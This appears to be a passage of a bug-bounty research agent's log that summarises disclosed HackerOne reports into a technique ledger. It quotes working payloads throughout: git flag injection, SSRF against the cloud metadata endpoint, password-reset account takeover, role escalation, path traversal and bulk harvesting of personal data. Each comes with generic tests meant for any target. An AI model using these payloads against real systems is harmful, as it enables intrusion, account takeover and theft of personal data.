# general-technique — part 12/45 (1 segment(s))
# content-aware dedupe applied; every unique entry preserved.

## [bugbountyhuntingskills.md] PASS 2026-11-11 (batch 147) — NOTHING NEW, 0 APPENDED

6 sources read ONE BY ONE in the assigned order; 4 VALID (readable, real, teaches a technique), 2 INVALID
(`visibility: no-content` stubs). 0 entries appended — no genuinely new technique, nothing fabricated.
NOTE: every one of the four valid sources is also OUTSIDE the 6–12-month freshness window (2021 → 2025-05),
which independently disqualifies it.

- #3120790 (WakaTime, "Session Replay Attack Allows Authentication Bypass via Captured Login Responses
  Allowing Bypass of 429 Too many attempts for Multiple Failed Logins", reporter `ctrl_cipher`, submitted
  2025-05-01, disclosed 2025-05-01, High 8.2, weakness Improper Authentication - Generic, closed
  **Informative**; ROUTE: `web_extract` -> HTTP 200, full reporter body + timeline + the pasted 302 response
  headers; corroborated by the live `.json`, `visibility: full`, 1,604 B). Technique: capture a successful
  login response (HTTP/2 302 + `Set-Cookie`, `Location: /dashboard`), then log out, send a login with a
  WRONG password, and replace the 400/429 response with the captured 302; the app authenticates the session.
  NOT APPENDED: the class is already recorded — ledger #745324 (~2280-2289) "session-token replay / missing
  session binding", whose DETECTION SIGNAL already says "NOT rotated on login, logout, or privilege change"
  and whose TRANSFERABLE TEST already says "test whether the token rotates on login/logout/privilege-change";
  the response-substitution delivery is a nuance of the same missing-invalidation root cause, and the
  429-bypass framing is a rate-limit primitive (doctrine §2(c)). WakaTime closed it Informative ("We list
  session fixation/replay as out of scope ... We only invalidate client-side login sessions when users change
  their passwords") and the report never demonstrates access to a DIFFERENT user's account (the captured
  response is the reporter's own session). 2025-05 = ~18 months, outside freshness.
- #1655629 (Acronis, "Bypassing Recaptcha Protection in `https://connect.acronis.com`", reporter `regexr`,
  submitted 2022-08-01, disclosed 2024-10-30, Low 0.1-3.9, weakness Violation of Secure Design Principles,
  closed Resolved / no bounty — "This asset is in Tier 3"; ROUTE: `web_extract` -> HTTP 200, full reporter
  body + both attachment URLs). Technique: the reCAPTCHA token on
  `POST https://connect.acronis.com/auth/register` is not validated or consumed server-side, so ONE token is
  reused for unlimited account creation. NOT APPENDED: captcha/rate-limit bypass is not a doctrine §1 class —
  §2(c) "most rate-limiting issues" and §2(d) DoS/traffic are ineligible, and the report's only stated impact
  is account flooding / "bomb out the system" (DoS); no chain to ATO/monetary/data is documented, so per the
  CHAIN-ONLY rule it is a primitive, not an entry. 2022, outside freshness.
- #2149124 (Frontegg, "PATCH method manipulation allowing the users to escalate their functionalities and
  edit (upgrade/downgrade) API Keys settings which is not allowed", reporter `bugsv2`, submitted 2023-09-15,
  disclosed 2024-03-20, Low 3.4, weakness Improper Access Control - Generic, closed; ROUTE: `web_extract` ->
  Keenable read timeout; the live `.json` -> HTTP 200, `visibility: full`, 2,645 B read IN FULL). Technique:
  the UI gives an Admin only create/delete on API keys, but
  `PATCH /frontegg/identity/resources/tenants/api-tokens/v1/<API_KEY_ID>` is not authorized — the reporter
  intercepts the allowed `DELETE` on an Owner's key, switches the method to `PATCH`, and sends
  `{"description":"desc111111","roleIds":["c22321ba-8ece-426d-b418-ece2a6d72009"]}` (the id = the `Impersonator`
  role); the key's role is rewritten. NOT APPENDED: both atoms are already recorded — method switching
  ("If `GET /api/v1/users/1002` returns 403 Forbidden, test whether alternative methods bypass the access
  check", Bugbountyskills.md ~15913) and the restricted-field write ("replay its write API (PUT/PATCH/upsert,
  JSON body) with the RESTRICTED fields populated — `grants`, `owner_grants`, `roles`, `traits`, `scopes`,
  `permissions` ...", ledger #2281075 ~2251); the UI-only-gate variant is recorded at ledger ~4829. The only
  delta (the UI hides the PATCH affordance) is a detection signal, not a new technique. 2023, outside freshness.
- #1300585 (Elastic, "blind Server-Side Request Forgery (SSRF) allows scanning internal ports", reporter
  `lu3ky-13`, submitted 2021-08-11, disclosed 2023-05-05, Medium 6.7, weakness Server-Side Request Forgery,
  closed; ROUTE: `web_extract` -> Keenable read timeout; the live `.json` -> HTTP 200, `visibility: full`,
  1,521 B read IN FULL). Technique:
  `GET /api/v1/http/default/raw?regex=%22service.name%22:/s*%22(package-registry)%22&statusCodeMax=200&statusCodeMin=200&url=http://<collaborator-host>:<PORT>`
  — the endpoint fetches the URL and returns JSON `{"type":"HTTP-RAW","status":"WARNING","message":"timeout/host
  unreachable"}` for a closed port and `{"status":"FAILURE","value":{"values":["<fetched body>"],"unit":"RAW"}}`
  for an open one; the PORT is varied in the collaborator URL to read open/closed. NOT APPENDED: the class and
  the test are already recorded — ledger #1960765 (~3355-3365) "BLIND SSRF in a URL-PREVIEW endpoint ... a
  built-in READ ORACLE + internal port scan" with the test "submit `url=http://127.0.0.1:<port>/` ... if the
  response carries og:title/meta OR its length/timing differs from a closed port ... then sweep hosts/ports";
  §2.4 (~304-311) "port-scan the loopback range and identify services by response ... fingerprint open
  loopback ports by status code and body length". The Elastic delta (port in an EXTERNAL collaborator URL;
  the differential is the JSON `message` field) is a variant of the recorded oracle, not a new method; the
  reporter themself rate the impact "reconnaissance" only. 2021, outside freshness.
- #2000000 (HackerOne, "2M Reports on HackerOne Celebration! - Ability to bulk-submit many reports.", reporter
  `nagli`, submitted 2023-05-24, disclosed 2023-07-11, Low 3.4, weakness Misconfiguration; ROUTE: `web_extract`
  -> Keenable read timeout; the live `.json` -> HTTP 200, `visibility: "no-content"`,
  `vulnerability_information` 0 B). INVALID: no reporter body; the title describes bulk report submission (a
  spam/abuse primitive), which is not a doctrine §1 class and has no endpoint, parameter or chain in the
  readable material.
- #1690427 (GitHub, "Managing Pages", reporter `too_busy`, submitted 2022-09-03, disclosed 2022-12-22, Medium,
  weakness Improper Access Control - Generic; ROUTE: `web_extract` -> Keenable read timeout; the live `.json`
  -> HTTP 200, `visibility: "no-content"`, `vulnerability_information` 0 B). INVALID: no reporter body; the
  title ("Managing Pages") carries no technique, no endpoint, no parameter, no chain.

6 sources read, 0 fabricated. No §17 slot — no genuinely new general method was taught.

- #1467044 (Cloudflare Public Bug Bounty, "Blind SSRF on platform.dash.cloudflare.com Due to Sentry misconfiguration",
  reporter `lohigowda`, submitted 2022-02-01, disclosed 2022-08-31, Low 0.1-3.9, weakness Server-Side Request Forgery
  (SSRF), state Resolved; ROUTE: `web_extract` -> HTTP 200, the Cloudflare TEAM SUMMARY rendered (the reporter body is NOT
  public — the live `.json` -> HTTP 200, `visibility: "no-content"`, `vulnerability_information` 0 B). Technique, from the
  summary, verbatim: "Due to the tool's misconfiguration (source code scraping feature enabled), it was possible to sent
  blind requests to any endpoints using the Cloudflare infrastructure." and "The issue has been fixed by the Engineering
  team and the source code fetching feature was disabled in Sentry." NOT APPENDED: the gadget is already recorded —
  §17.135 (Bugbountyskills.md ~21775-21780, from HackerOne #374737) records the identical method (harvest the Sentry DSN,
  POST one event whose `exception.values[].stacktrace.frames[].filename` is your collaborator URL, and the Sentry server
  fetches it -> blind SSRF -> IMDS), with the TRANSFERABLE TEST "harvest the DSN, POST one Sentry event with
  `frames[].filename` = your collaborator URL, and watch for the callback". The Cloudflare instance adds no new atom; it
  also carries a Low severity and a 2022 date, outside freshness.

SOURCE: https://hackerone.com/reports/1235008  2026-11-11
ROUTE: `web_extract` -> HTTP 200, the Rockstar Games TEAM SUMMARY rendered in full (the reporter body is NOT public — the
  live `.json` -> HTTP 200, `visibility: "no-content"`, `vulnerability_information` 0 B; the summary IS the complete public
  content and it carries the whole mechanism). Metadata: Rockstar Games, "Social Club Account Takeover Via RGL And
  Steam/Epic Linked Account", weakness Privilege Escalation, severity High 7.2 (Team; AV:N/AC:L/PR:H/UI:N/S:U), reporter
  `hacktus`, submitted 2021-06-15, disclosed 2021-11-17, state Resolved (retest accepted 2021-11-17).
STATUS: UNVERIFIED (not reproduced — no Rockstar/Steam/Epic account or launcher was touched this pass; every quote below
  is verbatim from the public team summary).
CLASS: authentication bypass / privilege escalation -> account takeover — a client account-SWITCH flow treats possession
  of a linked third-party credential as proof of the FIRST-PARTY account's identity, so it switches into the victim's
  first-party account with no credential prompt (CWE-287).
CORE METHOD:
  1. THE TRUST ASSUMPTION, verbatim: "The Launcher, in this state, assumed that if the current user had access to the
     linked third-party account (Epic Games or Steam), they must be the authentic user."
  2. THE PRECONDITION, verbatim: "the attacker first needed access to a Steam or Epic Games account with entitlement to
     a game with Social Club connectivity (such as GTAV or RDR2) and that had previously been linked to a Social Club
     account (i.e. the victim's account)."
  3. THE ACTION: the attacker launches an R* game; the Launcher detects the linked third-party account and "would allow
     the attacker to switch to the victim's Social Club account without prompting for credentials."
  4. THE IMPACT, verbatim: "This assumption gave the attacker access to the victim's entire Social Club account, even if
     the victim was utilizing mutli-factor authentication."
  5. THE FIX, verbatim: "Account switches occurring in contexts like this one will now require the user to re-authenticate
     by entering their Social Club account credentials if they have not done so recently on the device in question."
DETECTION SIGNAL: a desktop launcher / client / SSO that supports (a) linking a third-party provider account to a
  first-party account and (b) SWITCHING between accounts on one device; the switch path checks only whether the current
  OS/user session can reach the linked third-party account (its library/entitlement/session) and never asks for the
  first-party account's credentials; a "switch account"/"change user" action that completes while the first-party
  session is not re-authenticated. TELL: the vendor's own fix wording — re-authentication is required "if they have not
  done so recently on the device in question" — i.e. the missing control is a RE-AUTH GATE ON THE SWITCH, not on the link.
CHAIN: attacker holds a third-party account that is linked to the victim's first-party account (primitive: a linked
  credential — a stale link, a shared/family device, a link made before a password change, or a link the victim created
  to the attacker's account) -> the launcher's account-switch treats third-party access as identity proof and skips the
  first-party credential prompt (escalation: authentication bypass) -> the attacker is dropped into the victim's
  first-party account session (impact: full account takeover, the first-party MFA is never consulted). Per doctrine §8:
  preconditions = control of a third-party account linked to the victim's first-party account, plus a device where the
  launcher can see that link; gain = the victim's full first-party account with MFA bypassed.
TRANSFERABLE TEST: on ANY client/launcher/SSO that links a third-party provider to a first-party account and can SWITCH
  accounts on one device — (1) link a third-party account of yours to a first-party test account, then change the
  first-party password (the link persists); (2) on a second device/profile, sign in to the third-party provider only and
  launch/switch: if the first-party account opens with no credential prompt, the switch trusts the link; (3) in the
  web/SSO sibling, replay the account-switch callback with the third-party provider's token and no first-party session
  and see whether a first-party session is minted. Rule: **a linked third-party credential is a LINK, not an IDENTITY —
  any flow that switches or mints a first-party session from third-party possession alone, without re-authenticating
  the first-party account, is an ATO primitive.**
DEDUPE: 0 hits across all three write targets for `1235008`, `Social Club`, `RGL`, `hacktus`, or a "switch trusts the
  linked credential" flow. Pre-existing account-linking material REVIEWED and NOT re-recorded (different mechanism):
  §17.285 (an `external login` LINKING endpoint that takes the TARGET user's id in the path/body -> BOLA on linking —
  the id is attacker-supplied, no third-party possession involved), #1547684 (unlinking an external provider does not
  revoke its sessions — a session-lifecycle flaw, not a switch-trust flaw), and the Valve/Steam custom-scheme entries
  (§17.58 / §17.149). None records the missing RE-AUTH GATE ON ACCOUNT SWITCH. New general method -> §17.444.

- #1355817 (IBM, "SQL Injection in IBM access control panel & Broken access in admin panel", reporter `thecyberguy0`,
  submitted 2021-09-30, disclosed 2021-10-18, Critical 9-10, weakness SQL Injection, state Resolved; ROUTE: `web_extract`
  -> HTTP 200 but only the IBM TEAM SUMMARY renders; the live `.json` -> HTTP 200, `visibility: "no-content"`,
  `vulnerability_information` 0 B; `https://r.jina.ai/<url>` -> HTTP 401 (anonymous queries blocked, bad IP reputation);
  the Wayback capture `20251213225354` -> the HackerOne JavaScript-disabled shell, no body). INVALID: no reporter body on
  any route. The only public text is the team summary's one line, verbatim — "An application endpoint was found to be
  vulnerable to SQL Injection caused by a lack of sanitation on the client_id parameter. An adversary would eventually be
  able to read sensitive data from the database, or modify it as well as to execute administration operations." — which
  names a parameter and a feature but carries NO request shape, NO payload, NO injection type and NO bypass, so it
  teaches no reusable method; the SQLi class is in any case already covered across the ledger. Nothing invented.

- #1070247 (Phabricator, "Git flag injection leads to arbitrary file write", reporter `crownpeanut`, submitted 2021-01-02,
  disclosed 2021-07-25, High 8.5, state Resolved; ROUTE: `web_extract` -> HTTP 200, the reporter body rendered IN FULL;
  the live `.json` -> HTTP 200, `visibility: full`, and it carries the exact PoC request). Technique, verbatim from the
  body: `curl http://dev.localhost/api/diffusion.internal.gitrawdiffquery -d api.token=api-token -d
  commit=--output%3D/tmp/qqq -d repository=R2` — "Because lack of validation of `commit` parameter, this line will create
  command below when PoC is executed": `git log -n1 -M -C -B --raw -t 'abbrev=40' --pretty-format: '--output=/tmp/qqq'`;
  git parses the `commit` value as its own `--output` FLAG and writes its stdout to `/tmp/qqq` (`:100644 100644 ... M a.c`);
  "Notice that `/tmp/qqqq` is controllable path. By specifying the right path it is possible to do arbitrary write." The
  reporter's RCE rung (rewrite a `pre-receive` hook via a commit filename of `; ls`) is disputed by the maintainer,
  verbatim: "Since the attacker is limited in the content they can write and/or their ability to `+x` files, I don't see
  a _guaranteed_ pathway to escalating into RCE in the general case and suspect few systems are vulnerable in practice,
  but the `pre-commit` attack is straightforward in the case where the web process can write to it." NOT APPENDED: this is
  a textbook instance of the ALREADY-RECORDED git argument/flag-injection family — the ledger's own DETECTION SIGNAL
  names the carrier explicitly ("a parameter documented as a revision/branch/tag/sha/path (`ref=`, `revision=`,
  `branch=`, `commit=`, `path=`)", ledger ~2634) and the TRANSFERABLE TEST already says "for every ref/path parameter
  send `--help` then `--output=/tmp/<marker>`" (§17.30 / #658013 `ref=--output=`, #587854 directory-name-as-flag, §17.134 /
  #653125 two-writer race, #682442 `--no-index` read). The `--pretty-format:` adjacency is how the app happened to place
  the value in argv; it is not a new technique, and the hook-write rung is an instance of the recorded "walk the write to
  a file the service trusts/executes" principle. The only delta (the Diffusion `diffusion.internal.gitrawdiffquery`
  endpoint) is an entry point, not a method. 2021, outside freshness.

- #1055823 (Helium, "SSRF By adding a custom integration on console.helium.com", reporter `th0roid`, submitted 2020-12-10,
  disclosed 2021-05-26, High 7-8.9, weakness Server-Side Request Forgery (SSRF), state Resolved; ROUTE: `web_extract` ->
  HTTP 200, the reporter body rendered IN FULL; the live `.json` -> HTTP 200, `visibility: full`). Technique, verbatim:
  "A Server Side Request Forgery vulnerability was found in the *Add a custom Integration* feature on
  *console.helium.com*. By creating a custom HTTP integration, and setting the integration endpoint to
  http://169.254.169.254/latest/meta-data private meta-data from the AWS EC2 instance running can be retrieved." and
  "The server makes the HTTP request and sets the response body as the integration message every time that the device
  sends a packet. As the endpoint input is not validated, this makes the application vulnerable to a critical SSRF."
  NOT APPENDED: the class, the entry-point family and the oracle are all already recorded — the ledger's generic SSRF
  entry (~3363) names "any feature that fetches a user-supplied URL server-side — link/URL/image preview, unfurl, 'import
  from URL', avatar-from-URL, webhook tester, RSS reader, PDF/screenshot renderer" with the test "submit
  `url=http://127.0.0.1:<port>/`, `url=http://169.254.169.254/latest/meta-data/` ... then sweep hosts/ports"; the
  read-back oracle ("the fetched BODY is retrievable from a second endpoint ... that read-back is what makes it
  full-response", ~2440) covers the stored integration message; and §2.4 (~274-285, #2301565) already records a
  webhook-validation SSRF. The Helium instance adds no new atom. 2020, outside freshness.

- #1175081 (UPchieve, "Full account takeover of any user through reset password", reporter `saajanbhujel`, submitted
  2021-04-26, disclosed 2021-05-14, Critical 9.1, weakness Improper Access Control - Generic, state Duplicate (of #1166500);
  ROUTE: `web_extract` -> HTTP 200, the reporter body rendered IN FULL; the live `.json` -> HTTP 200). Technique, verbatim:
  intercept the forgot-password request and "add your email also in the JSON body. like this:
  `{"email":["victim@gmail.com","your@gmail.com"]}`" -> "Now victim and you will receive the same password reset link" ->
  "You can fully takeover the victim's account by reset password." NOT APPENDED: the atom is already recorded verbatim —
  ledger #2293343 (~2122-2132, GitLab, "Account Takeover via Password Reset without user interactions", Critical 10.0,
  $35,000) is the SAME JSON scalar->array type confusion on the reset-email parameter, and its TRANSFERABLE TEST already
  says: "replay the request as JSON and submit the field as (a) array `["victim","attacker"]`, (b) duplicate keys
  `email=victim&email=attacker`, (c) nested `user[email][]=attacker`". The UPchieve report is itself marked Duplicate and
  is the older instance (2021 vs the GitLab report's 2025 disclosure). Nothing new.

NOTE — reader pass 2026-11-11 batch 145 (6 assigned sources read ONE BY ONE in the given order; 1 entry appended to the
harvest ledger `/root/bugbountyhuntingskills.md` and the dated knowledge file
`/root/hackbot-architecture/knowledge/methodologies-2026-11-11.md`; 1 new §17 slot). NEW: HackerOne #1235008 (Rockstar
Games, "Social Club Account Takeover Via RGL And Steam/Epic Linked Account", reporter hacktus, submitted 2021-06-15,
disclosed 2021-11-17, High 7.2, Privilege Escalation; `visibility: no-content`, technique read in full from the Rockstar
team summary) -> §17.444 — a launcher/client account-SWITCH treats possession of a linked third-party credential as
proof of the first-party account's identity and switches with no credential prompt -> full ATO with the first-party MFA
never consulted. VALID BUT NOT APPENDED (duplicate): #1467044 (Cloudflare Sentry source-code-scraping blind SSRF =
§17.135), #1070247 (Phabricator `commit=--output=` git flag injection = the recorded git argv-injection family, whose
DETECTION SIGNAL already names `commit=`), #1055823 (Helium custom-integration SSRF -> IMDS = the recorded
user-supplied-URL SSRF + read-back oracle), #1175081 (UPchieve reset-email JSON array = ledger #2293343). INVALID (nothing
invented): #1355817 (IBM SQLi in `client_id` — `visibility: no-content` 0 B on every route; only a one-line team summary
naming a parameter, no request shape/payload/bypass). 6 sources read, 0 fabricated.

SOURCE: https://hackerone.com/reports/1131465  2026-11-11
ROUTE: `web_extract` -> HTTP 200, the reporter body rendered IN FULL (36,635 clean chars, saved to
`/root/.hermes/cache/web/hackerone.com-1cf964ca7e.md`; the omitted middle was read back from that file).
Ruby, "Path traversal in Tempfile on windows OS due to unsanitized backslashes" (reporters
`bugdiscloseguys` / HTTPVoid — Harsh and Rahul — with collaborator `iamnoooob`; submitted 2021-03-20,
disclosed 2021-04-07, Resolved, Medium 4 ~ 6.9, weakness Path Traversal, CVE-2021-28966; the Internet
Bug Bounty rewarded both reporters). FRESHNESS CAVEAT: 2021, outside the preferred 6-12-month window —
admitted because it was opened and read in full THIS pass and the specific mechanism was absent from
all three write targets (0 hits for `Tempfile`, `UNUSABLE_CHARS`, `ALT_SEPARATOR`, `String#delete`).
STATUS: UNVERIFIED (not reproduced — no Windows Ruby host stood up this pass; the RCE rung is the
reporter's assertion, not a demonstrated PoC)
CLASS: Path traversal -> arbitrary file create (CWE-22) inside a temp-file helper; the reusable atom
is the SANITIZER, not Ruby.
CORE METHOD:
  1. THE CARRIER, verbatim: "both arguments (basename and ext) of Tempfile on Windows are vulnerable to
     a path traversal which could allow unintentional file creating in arbitrary writable directories.
     Tempfile often has a user control either by basename or ext (or both)." Any app that passes a
     user-influenced basename or extension into `Tempfile`/`Tempfile.open` (upload temp names, export
     filenames, a user-supplied `filename=` on a generated file) is the entry point.
  2. THE SANITIZER AND ITS FLAW, verbatim: "both arguments go through String::delete(UNUSABLE_CHARS) to
     delete OS file separators from the basename and ext ... however the incorrect usage of delete()
     will cause the bug to occur." `UNUSABLE_CHARS = [File::SEPARATOR, File::ALT_SEPARATOR,
     File::PATH_SEPARATOR, ":"].uniq.join("").freeze` -> the 4-char set `/\;:`. On Windows
     `File::ALT_SEPARATOR` is `\` ("For linux File::ALT_SEPARATOR is `nil` while for Windows its `\`"),
     so the set itself contains a backslash.
  3. THE MECHANISM: Ruby's `String#delete` set syntax follows `tr` — a `\` inside the set ESCAPES the
     next character rather than being a literal deletion target. In the set `/\;:`, the `\` escapes the
     `;`, so `\` is never deleted. Verbatim: `"FUZZ/../me/..\\please".delete(UNUSABLE_CHARS)` ->
     `"FUZZ..me..\\please"` — "As you can see `\\` still remains, this is because we need to escape
     `\\` (when followed by characters) before passing it to delete." The `/` IS removed; the `\` is NOT.
  4. THE RESULTING PATH, verbatim: `Tempfile.open(["..\..\..\..\..\Users\rootx\malicious",".rb"])` ->
     `#<Tempfile:C:/Users/rootx/AppData/Local/Temp\..\..\..\..\Users\rootx\malicious20210321-22472-fvuodx.rb>`
     and `dir C:\Users\rootx\` lists `malicious20210321-22472-fvuodx.rb` (0 bytes) — the file is
     created OUTSIDE the temp directory, at an attacker-chosen writable path. "The same can be
     accomplished via ext argument."
  5. ROOT-CAUSE DEPTH (collaborator `iamnoooob`, verbatim): `String#delete` maps to `rb_str_delete_bang`
     in `string.c`; "When there's a deletion of character performed on the input string, then the
     below If block should hit. However, in the case of `"aaa\\..\\".delete("\\/")` squeeze[c] was never
     true which led to no modifications." The `squeez` table is built by `tr_setup_table` — "the
     'squeez' array is populated via `tr_setup_table(s, squeez, i==0, &del, &nodel, enc)` call on line
     7695 which should imply the bug should be somewhere there" — and the same helper backs
     `squeeze`, which "also seems to suffer from a similar issue."
  6. VENDOR CONFIRMATION: Ruby staff — "This report was regression with
     https://github.com/ruby/ruby/commit/1c7e303b26090205f393595f15dadddd4b2d31b6"; `nobu` attached
     `0001-Make-usable-chars-more-strict.patch`; the reporters confirmed the fix.
DETECTION SIGNAL: any server-side helper that builds a temp/upload/export filename from user input and
"sanitizes" it by DELETING a blocklist of separator characters (`String#delete`, `tr`, a `gsub`
char-class, a `str_replace`/`replaceAll` list) instead of rejecting or allowlisting; the tell is a
deletion primitive whose set/regex syntax gives `\` a special meaning (an escape) so the blocklist
silently fails to remove it; a Windows target, or any target where `\` is a path separator (Windows
`ALT_SEPARATOR`, SMB/UNC paths, a Windows file share mounted into a Linux app); a filename/path
parameter whose value comes back in an error message, a download URL, a log line or a directory
listing with the `\` still present. Second signal: the sanitizer was written and tested on Linux —
where `\` is an ordinary filename character — and the app is deployed on Windows.
CHAIN: user-controlled basename/ext reaches a temp-file helper (primitive: one filename field) -> the
separator-blocklist sanitizer's deletion primitive treats `\` as an escape, so the ALT_SEPARATOR
survives -> the helper creates the file at an attacker-chosen path OUTSIDE the intended temp/upload
directory (DEMONSTRATED: `C:\Users\rootx\malicious...rb`, 0 bytes) -> ESCALATION (ASSERTED, not
demonstrated in the report): if the application writes attacker-influenced content into that file, or
the chosen path is one the app later loads/sources/executes — a `.rb` in `$LOAD_PATH`, a
config/plugins directory, a cron directory, an `.htaccess`/`web.config`, a DLL/`.so` directory, a
restart-watched file — the arbitrary file create becomes code execution. The reporter's own wording is
the honest limit: "Unintentional file creation in an arbitrary directory. Could potentially cause RCE
in RoR applications." No RCE PoC is included, so the chain's top rung is a lead, not a finding.
TRANSFERABLE TEST: on ANY filename/path parameter — (1) send a value with `..\` in the MIDDLE
(`..\..\tmp\x`), a trailing `..\`, a doubled `..\\`, and a `\`-only traversal (`..%5c`), and compare
the resulting path (response body, error/log line, download URL, or the file's actual location) with
the sanitized expectation — if the backslash survives into the path, the blocklist-deletion primitive
is escape-aware and the filter is broken; (2) run the `\`-only variants on EVERY Windows target even
when the `/` variants are correctly stripped — a `/`-only regex or a Linux-tested sanitizer passes
them; (3) once a separator survives, aim it at a directory the application later loads/executes and
check whether the file lands there. Rule: a sanitizer that DELETES a separator blocklist can itself
preserve a separator when the deletion helper treats `\` as an escape — always test `\` variants
separately from `/`, and treat "the sanitizer runs on Linux, the app runs on Windows" as a live
asymmetry, not a safe deployment.

NOTE — reader pass 2026-11-11 batch 146 (6 assigned sources read ONE BY ONE in the given order; 1 entry
appended to the harvest ledger `/root/bugbountyhuntingskills.md` and the dated knowledge file
`/root/hackbot-architecture/knowledge/methodologies-2026-11-11.md`; 1 new §17 slot). NEW: HackerOne
#1131465 (Ruby, "Path traversal in Tempfile on windows OS due to unsanitized backslashes", reporters
bugdiscloseguys/HTTPVoid + iamnoooob, submitted 2021-03-20, disclosed 2021-04-07, Medium 4~6.9, Path
Traversal, CVE-2021-28966; `visibility: full`, body read in full via `web_extract`) -> §17.445 —
`Tempfile.open(basename, ext)` sanitizes both args with `String#delete(UNUSABLE_CHARS)`, whose set
`/\;:` contains `\` (the Windows `File::ALT_SEPARATOR`); `String#delete`'s set syntax treats `\` as an
escape, so the backslash is never deleted -> `..\..\` survives -> the temp file is created outside the
temp dir at an attacker-chosen writable path -> arbitrary file create (RCE asserted, not demonstrated).
INVALID / UNREACHABLE (nothing invented): #758978 (Mail.ru WebDAV XXE PROPFIND/PROPPATCH —
`visibility: no-content`, 0 B in the local parquet mirror; live page -> Cloudflare sign-in wall, browser
-> "Just a moment", `r.jina.ai` -> Cloudflare, `.json` -> empty HTML shell, all three Wayback snapshots
-> title-only SPA shell, no credited writeup found), #472470 (Uber/Jump blind XSS via user name —
`visibility: no-content`, team summary only, no payload/param; the carrier is already recorded as
#948929, ledger ~5011), #799881 (PayPal reflected XSS + CSP bypass — `visibility: no-content`, team
summary names no parameter or payload), #1029723 (Stripo no rate limiting + CORS — `visibility:
no-content`, team summary is "The vulnerability has been fixed"; both classes are doctrine §2
ineligible), #835200 (drive2.ru no rate limit on comments — `visibility: no-content`, researcher
summary = a 1000-comments-per-minute threshold; rate limiting is doctrine §2(c) ineligible and the
program rated it Low). 6 sources read, 0 fabricated.

SOURCE: https://hackerone.com/reports/787955  2026-11-11
ROUTE: `web_extract` -> HTTP 200 (partial body, both HTTP requests truncated) THEN
`https://r.jina.ai/https://hackerone.com/reports/787955` -> the FULL report body with both requests
verbatim; the live `.json` route also returns HTTP 200, `visibility: full`, `vulnerability_information`
1,307 B. Metadata: Lab45 / Topcoder, "PII of Users Disclosure using \"/members/invite/\" endpoint",
weakness Information Disclosure, severity High 7.1, reporter `bonikia97`, submitted 2020-02-03,
disclosed 2020-04-13, Resolved, 52 votes, asset connect.topcoder.com.
STATUS: UNVERIFIED (not reproduced — no Topcoder account was touched this pass; every request line below
is verbatim from the report body).
CLASS: IDOR/BOLA + sensitive information disclosure with PoC — a member SEARCH endpoint whose
response-projection (`fields`) and query (`query`) parameters are caller-controlled, plus an
invite/add-member WRITE endpoint that echoes the full record for an ARRAY of arbitrary userIds -> mass
PII enumeration of every user, including admins (CWE-639 / CWE-200 / CWE-918-adjacent).
CORE METHOD:
  1. THE SEARCH ENDPOINT, verbatim request:
     GET /v3/members/_search/?fields=userId%2Chandle%2CphotoURL%2CfirstName%2ClastName%2Cdetails%2Cemail&query=email%3A@wearehackerone.com&limit=1000 HTTP/1.1
     Host: api.topcoder.com
     Authorization: <your own token>
     Origin: https://connect.topcoder.com
     Referer: https://connect.topcoder.com/projects/13482/
     The `fields` parameter is a COMMA-SEPARATED PROJECTION THE CALLER CONTROLS — it names `email`, a
     field the rest of the product never returns ("If you check other endpoints, nowhere is the user's
     email shown"). The `query` parameter is a server-side search expression; `email:@<domain>` harvests
     every user at an e-mail domain. `limit=1000` lifts the page cap.
  2. THE WRITE ENDPOINT, verbatim request:
     POST /v5/projects/13482/members/invite/?fields=id%2CprojectId%2CuserId%2Cemail%2Crole%2Cstatus%2CcreatedAt%2CupdatedAt%2CcreatedBy%2CupdatedBy%2Chandle%2CfirstName%2ClastName%2CphotoURL HTTP/1.1
     Host: api.topcoder.com
     Content-Type: application/json
     Authorization: <your own token>
     Origin: https://connect.topcoder.com
     Referer: https://connect.topcoder.com/projects/13482/
     {"userIds":[41008482,41008483,41008486,41012377],"role":"customer"}
     The body is an ARRAY of arbitrary numeric userIds; the RESPONSE returns the e-mail + full record
     for each id, whether or not they belong to the project. The reporter's own words: "Put any userIds,
     and send the Request. ... Look the Response, the email and more information of users can be seen."
  3. THE CHAIN THE REPORTER USED: use the GET search to turn an e-mail domain into a set of userIds,
     then feed those ids to the POST invite endpoint to read their PII — and walk the ids (±1) because
     they are sequential.
  4. SCOPE OF IMPACT, verbatim: "If the attacker wanted, he could see the information of the Admins, or
     any Member of TopCoder."
DETECTION SIGNAL: a member/user SEARCH endpoint whose `fields`/`query`/`limit` parameters are echoed
into the response projection and the query engine — especially a `fields` list that accepts a sensitive
field (`email`, `phone`, `address`) the UI never requests; a `query` syntax that accepts a field filter
(`email:@domain`, `email:*@domain`); an invite/add-member/share WRITE endpoint whose RESPONSE contains
the created/invited object's full record (e-mail, name, handle) for ids you supplied; sequential numeric
user ids; a `fields`/`expand`/`include` parameter present on a WRITE endpoint too.
CHAIN: any authenticated low-priv user (primitive: an ordinary Topcoder member with a project) -> the
search endpoint's `fields` projection is caller-controlled, so request `email` (primitive:
field-projection injection on a search) -> the `query=email:@domain` filter + `limit=1000` harvests a
domain's userIds (escalation: bulk identifier harvest) -> the invite endpoint accepts an array of
arbitrary userIds and returns their e-mail + PII (escalation: write-endpoint response over-share / BOLA
on the invited record) -> mass PII enumeration of every user and admin (impact: full user-base PII
disclosure; program rated High 7.1). Per doctrine §8: preconditions = any ordinary authenticated account
on the platform; gain = e-mail + profile PII of any user, including admins.
TRANSFERABLE TEST: on ANY member/user search endpoint — (1) capture the request and add/replace the
`fields` parameter with a comma-separated list that includes a sensitive field the UI never requests
(`email`, `phone`, `address`, `private_*`); (2) set the `query`/`filter` parameter to a domain filter
(`email:@<target-domain>`, `email:*@<domain>`) and raise `limit`; (3) diff the returned key set against
the UI's response — a sensitive field present in the API response but absent from the UI is the
disclosure; (4) on any invite/add-member/share WRITE endpoint, replace the id array with arbitrary
sequential ids and check whether the RESPONSE echoes their e-mail/PII. Rule: **the response-projection
parameter is part of the query, not a UI convenience — if the caller can name a sensitive field the API
will return it; and a write endpoint that echoes the invited/added record will hand back the PII of any
id you name.**
DEDUPE: 0 hits across all three write targets for `787955`, `topcoder`, `members/invite`, `_search`,
`email:@`, `userIds`. Pre-existing material REVIEWED as related-but-distinct: ledger ~1264/1348 (the
generic `fields=`/`expand=`/`include=` "request more than the UI does" checklist — the PRIMITIVE is
recorded, but not the search-endpoint `query=email:@domain` harvest nor the invite-endpoint array
over-share), §17.28 / #807448 (an invite/resolve endpoint that returns a private e-mail — a SINGLE
handle->e-mail resolution, not an array-of-ids mass enumeration), and the mass-assignment PATCH entries
(a WRITE-field injection, not a READ-projection injection). NO §17 slot: the general method
(response-projection injection + write-response over-share) is already recorded as atoms; this is a
